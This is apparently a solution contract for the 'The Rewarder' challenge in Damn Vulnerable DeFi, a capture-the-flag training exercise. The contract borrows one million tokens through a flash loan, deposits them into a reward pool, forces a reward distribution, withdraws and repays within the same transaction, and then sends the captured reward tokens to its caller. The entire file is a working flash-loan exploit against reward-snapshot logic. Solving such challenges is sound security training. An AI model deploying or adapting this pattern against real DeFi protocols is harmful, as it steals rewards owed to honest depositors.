//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";
import "./AccountingToken.sol";
import "./RewardToken.sol";

contract RewardCollector {
    FlashLoanerPool public loanerPool;
    TheRewarderPool public rewarderPool;
    DamnValuableToken public liqToken;
    AccountingToken public accToken;
    RewardToken public rewardToken;

    constructor(
        address _loanerPool,
        address _rewarderPool,
        address _liqToken,
        address _accToken,
        address _rewardToken
    ) {
        loanerPool = FlashLoanerPool(_loanerPool);
        rewarderPool = TheRewarderPool(_rewarderPool);
        liqToken = DamnValuableToken(_liqToken);
        accToken = AccountingToken(_accToken);
        rewardToken = RewardToken(_rewardToken);
    }

    function takeLoan() public {
        loanerPool.flashLoan(1000000 ether);
    }

    function receiveFlashLoan(uint256 amount) public {
        liqToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.distributeRewards();
        rewarderPool.withdraw(amount);
        liqToken.transfer(address(loanerPool), amount);
    }

    function retrieve() public {
        uint256 _balance = rewardToken.balanceOf(address(this));
        rewardToken.transfer(msg.sender, _balance);
    }
}
